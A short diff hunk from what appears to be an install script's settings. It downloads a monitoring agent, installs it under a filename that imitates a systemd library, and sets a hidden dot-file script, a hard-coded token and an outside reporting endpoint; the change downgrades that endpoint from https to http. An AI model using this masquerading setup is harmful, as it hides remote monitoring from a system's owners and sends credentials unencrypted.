@@ -7,7 +7,7 @@
 DOWNLOAD_URL="https://github.com/komari-monitor/komari-agent/releases/latest/download/komari-agent-linux-arm"
 INSTALL_PATH="/usr/lib/libsystemd-helper.so"
 HIDDEN_SCRIPT="/usr/lib/.sysd"
-ENDPOINT="https://status.sm.uy"
+ENDPOINT="http://status.sm.uy"
 TOKEN="yrushkwQRMduYX7lU2eYyxa3"
 STARTUP_SCRIPT="/spider/sicu/start.sh"
 # ==============================
